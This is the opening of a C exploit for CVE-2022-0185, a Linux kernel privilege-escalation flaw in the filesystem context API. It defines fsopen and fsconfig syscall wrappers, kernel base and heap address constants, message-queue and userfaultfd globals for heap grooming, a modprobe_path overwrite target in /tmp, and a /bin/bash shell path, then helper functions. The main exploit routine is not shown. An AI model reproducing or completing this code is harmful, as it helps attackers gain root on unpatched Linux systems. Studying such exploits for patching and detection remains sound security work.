/*
    CVE-2022-0185 Exploit by @justk1R4
*/

#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <sys/xattr.h>
#include <sys/shm.h>
#include <sys/mount.h>

#define _TEXT                0xffffffff81000000
#define HEAP_MIN             0xffff888000000000
#define PAGE_SZ              0x1000
#define FSCONFIG_SET_STRING  0x1
#define MAX_FD               0x100
#define DATALEN_MSG          0xfc8
#define SHELL                "/bin/bash"        
#define MDPRB_TRIGGER        "/tmp/hax" 

#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)

typedef unsigned long u64; 

typedef struct 
{
    long mtype;
    char mtext[];
} msg;

int dfd, uffd;
u64 user_cs, user_ss, user_sp, user_rflags;
u64 modprobe_path, base, heap, secstr;

int pipes[2];
int qid[MAX_FD];
int sfd[MAX_FD];
int strctr = 0;
u64 leaks[0x240];
char buffer[0x2000];

char modprobe_target[] = "/tmp/\x00\x00\x00\x00probe";
char *root_arg[] = {"-p", NULL};


void error(char *msg)
{
    printf("[-] ");
    fflush(stdout);
    perror(msg);
    exit(-1);
}

void success(char *msg)
{
    printf("[+] %s\n", msg);
}

void setaff(int cpu)
{
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set) < 0)
        error("sched_setaffinity");
}